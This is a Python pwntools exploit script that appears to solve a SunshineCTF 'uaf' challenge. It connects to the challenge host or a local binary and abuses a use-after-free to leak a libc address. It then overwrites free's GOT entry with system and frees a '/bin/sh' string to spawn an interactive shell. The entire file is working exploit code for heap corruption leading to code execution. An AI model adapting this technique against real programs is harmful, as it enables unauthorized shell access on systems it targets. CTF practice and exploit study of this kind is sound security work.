#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./uaf"
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")
libc_address=0

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("chal1.sunshinectf.org",20001)
    pid=0

def debug():
    log.debug("libc address:0x%x"%libc_address)
    log.debug("process pid:%d"%pid)
    pause()

def add_str(s):
    conn.sendlineafter("(>) ","2")
    conn.sendlineafter("Enter a text string:\n",s)
    conn.recvuntil("ID of text string: ")
    return conn.recvline(keepends=False)

def show_str(ID):
    conn.sendlineafter("(>) ","5")
    conn.sendlineafter("Enter object ID:",ID)
    conn.recvuntil("Text string:\n")
    return conn.recvline(keepends=False)[1:-1]

def del_str(ID):
    conn.sendlineafter("(>) ","7")
    conn.sendlineafter("Enter object ID:",ID)

def add_array(n,l):
    conn.sendlineafter("(>) ","1")    
    conn.sendlineafter("How many integers?\n",str(n))
    conn.sendlineafter("Enter %d integers:"%n," ".join(map(lambda x:str(x),l)))
    conn.recvuntil("ID of integer array:")
    return conn.recvline(keepends=False)

def del_array(id):
    conn.sendlineafter("(>) ","6")
    conn.sendlineafter("Enter object ID:\n",id)
    
def edit_array(id,index,value):
    conn.sendlineafter("(>) ","3")
    conn.sendlineafter("Enter object ID:\n",id)    
    conn.sendlineafter("Enter index to change:\n",str(index))
    conn.sendlineafter("Enter new value:",str(value))

id=add_str("a"*0x88)
add_str("a"*0x10)
del_str(id)
libc_address=u32(show_str(id)[:4])-0x1b27b0
shell=add_str("/bin/sh")

id=add_array(3,[1,2,3])
del_array(id)
add_str("a"*4+p32(elf.got["free"]))


edit_array(id,0,libc_address+libc.symbols["system"]-0x100000000)
del_str(shell)

conn.interactive()
